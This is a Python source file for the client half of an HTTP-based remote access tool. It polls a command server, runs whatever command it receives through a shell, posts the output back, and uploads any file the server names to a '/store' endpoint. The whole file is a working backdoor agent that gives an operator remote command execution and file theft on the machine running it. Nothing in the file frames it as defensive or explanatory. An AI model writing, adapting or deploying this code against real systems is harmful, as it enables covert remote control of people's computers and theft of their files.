# Client

import requests  # Library to be installed and imported
import subprocess
import time
import os

while True:

    # Send GET request to host machine
    req = requests.get('http://localhost:8080')
    # Store the received txt into command variable
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split('*')

        if os.path.exists(path):
            url = 'http://localhost:8080/store'  # Append /store in the URL
            # Add a dictionary key where file will be stored
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)  # Send the file
            # requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(
                url='http://localhost:8080', data='[-] Not able to find the file !')
    else:
        print(f"Additional command running {command}")
        CMD = subprocess.Popen(command, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        post_response = requests.post(
            url='http://localhost:8080', data=CMD.stdout.read())
        post_response = requests.post(
            url='http://localhost:8080', data=CMD.stderr.read())
    time.sleep(3)
